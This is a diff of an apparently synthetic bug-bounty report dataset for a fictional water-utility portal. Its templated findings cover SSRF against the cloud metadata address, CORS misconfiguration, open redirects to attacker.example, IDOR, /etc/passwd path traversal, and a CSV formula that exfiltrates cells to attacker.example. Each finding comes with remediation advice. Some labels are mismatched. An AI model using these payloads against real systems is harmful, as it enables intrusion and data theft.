+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.alpenquell-wasserwerke.foo/api/import`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2987,7 +3010,8 @@
           "offset": "4d 6h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.alpenquell-wasserwerke.foo/fetch`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3094,7 +3118,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.alpenquell-wasserwerke.foo/profile`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3189,7 +3214,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.alpenquell-wasserwerke.foo/console/queue`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -3328,7 +3354,8 @@
           "offset": "7d 6h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.alpenquell-wasserwerke.foo/api/me`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3436,7 +3463,8 @@
           "offset": "1d 9h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://api.alpenquell-wasserwerke.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3559,7 +3587,8 @@
           "offset": "7d 4h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.alpenquell-wasserwerke.foo/api/me`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3678,7 +3707,8 @@
           "offset": "6d 20h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.alpenquell-wasserwerke.foo/statements/`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3802,7 +3832,8 @@
           "offset": "3d 13h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.alpenquell-wasserwerke.foo/export`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3957,7 +3988,8 @@
           "offset": "2d 14h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.alpenquell-wasserwerke.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4072,7 +4104,8 @@
           "offset": "5d 21h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.alpenquell-wasserwerke.foo/api/documents/`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4204,7 +4237,8 @@
           "offset": "1d 20h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.alpenquell-wasserwerke.foo/export?type=records`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4308,7 +4342,8 @@
           "offset": "16h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.alpenquell-wasserwerke.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4440,7 +4475,8 @@
           "offset": "1d 11h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.alpenquell-wasserwerke.foo/api/v2/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4592,7 +4628,8 @@
           "offset": "6d 13h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.alpenquell-wasserwerke.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4715,7 +4752,8 @@
           "offset": "3d 17h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.alpenquell-wasserwerke.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4839,7 +4877,8 @@
           "offset": "1d 7h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.alpenquell-wasserwerke.foo/export?type=records`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4962,7 +5001,8 @@
           "offset": "1d 1h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.alpenquell-wasserwerke.foo/admin/queue`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -5086,7 +5126,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.alpenquell-wasserwerke.foo/v2/me`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5225,7 +5266,8 @@
           "offset": "5d 23h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.alpenquell-wasserwerke.foo/export?type=records`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5341,7 +5383,8 @@
           "offset": "3d 20h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.alpenquell-wasserwerke.foo/console/queue`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -5437,7 +5480,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.alpenquell-wasserwerke.foo/api/me`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5565,7 +5609,8 @@
           "offset": "1d 14h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.alpenquell-wasserwerke.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5678,7 +5723,8 @@
           "offset": "6d 10h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://www.alpenquell-wasserwerke.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5790,7 +5836,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.alpenquell-wasserwerke.foo/api/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5908,7 +5955,8 @@
           "offset": "14h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.alpenquell-wasserwerke.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6035,7 +6083,8 @@
           "offset": "4d 3h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.alpenquell-wasserwerke.foo/api/v2/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6199,7 +6248,8 @@
           "offset": "7d 9h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.alpenquell-wasserwerke.foo/profile`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6305,7 +6355,8 @@
           "offset": "3d 20h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.alpenquell-wasserwerke.foo/profile`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6428,7 +6479,8 @@
           "offset": "7d 12h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.alpenquell-wasserwerke.foo/api/v2/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6547,7 +6599,8 @@
           "offset": "2d 7h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.alpenquell-wasserwerke.foo/export?type=records`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6697,7 +6750,8 @@
           "offset": "8d 13h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
